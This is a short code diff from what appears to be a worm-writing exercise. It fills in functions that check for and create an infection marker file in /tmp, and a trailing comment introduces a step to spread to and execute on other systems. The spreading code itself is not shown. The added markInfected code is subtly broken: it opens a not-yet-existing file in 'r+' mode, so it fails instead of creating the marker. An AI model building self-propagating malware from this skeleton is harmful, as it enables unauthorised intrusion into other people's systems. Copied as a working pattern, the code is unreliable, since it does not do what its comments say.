@@ -26,8 +26,14 @@ def isInfectedSystem():
 	# approach is to check for a file called
 	# infected.txt in directory /tmp (which
 	# you created when you marked the system
-	# as infected). 
-	pass
+	# as infected).
+	
+	try:
+		file = open("/tmp/infected.txt")
+		file.close()
+		return True
+	except IOError:
+		return False
 
 #################################################################
 # Marks the system as infected
@@ -37,7 +43,10 @@ def markInfected():
 	# Mark the system as infected. One way to do
 	# this is to create a file called infected.txt
 	# in directory /tmp/
-	pass	
+	
+	file = open("/tmp/infected.txt", "r+")
+	file.write("This system is infected.")
+	file.close()
 
 ###############################################################
 # Spread to the other system and execute
